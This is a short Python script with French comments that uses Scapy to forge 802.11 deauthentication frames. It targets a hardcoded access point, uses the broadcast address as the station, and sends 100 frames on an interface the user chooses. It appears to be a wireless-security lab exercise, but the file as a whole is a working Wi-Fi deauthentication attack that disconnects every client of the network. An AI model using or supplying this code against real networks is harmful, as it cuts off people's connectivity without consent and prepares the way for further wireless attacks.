#!/usr/bin/env python

from scapy.all import *

# Fonction pour générer une trame de déauthentification
def generate_deauth(mac_ap, mac_sta, reason_code):
    pkt = RadioTap() / Dot11(addr1=mac_sta, addr2=mac_ap, addr3=mac_ap) / Dot11Deauth(reason=reason_code)
    return pkt

# Fonction pour envoyer la trame à l'adresse MAC de destination
def send_packet(pkt, mac_dest, interface):
    sendp(pkt, iface=interface, count=100, inter=0.1, verbose=1)

# Adresse MAC de l'AP et de la STA
mac_ap = '6E:B8:9E:63:D2:51'
mac_sta = 'FF:FF:FF:FF:FF:FF'

# Raison pour la déauthentification
print("Choisissez la raison pour la déauthentification : ")
print("1 - Unspecified")
print("4 - Disassociated due to inactivity")
print("5 - Disassociated because AP is unable to handle all currently associated stations")
print("8 - Deauthenticated because sending STA is leaving BSS")
reason_code = input("Entrez le code de raison : ")

print("Entrez l'interface utilisée")
interface = input("Interface: ")

# Générer la trame de déauthentification
pkt = generate_deauth(mac_ap, mac_sta, int(reason_code))

# Envoyer la trame à la STA ou à l'AP en fonction de l'adresse MAC de destination
if pkt.addr1 == mac_sta:
    send_packet(pkt, mac_sta, interface)
else:
    send_packet(pkt, mac_ap, interface)

print("La trame de déauthentification a été envoyée avec succès.")
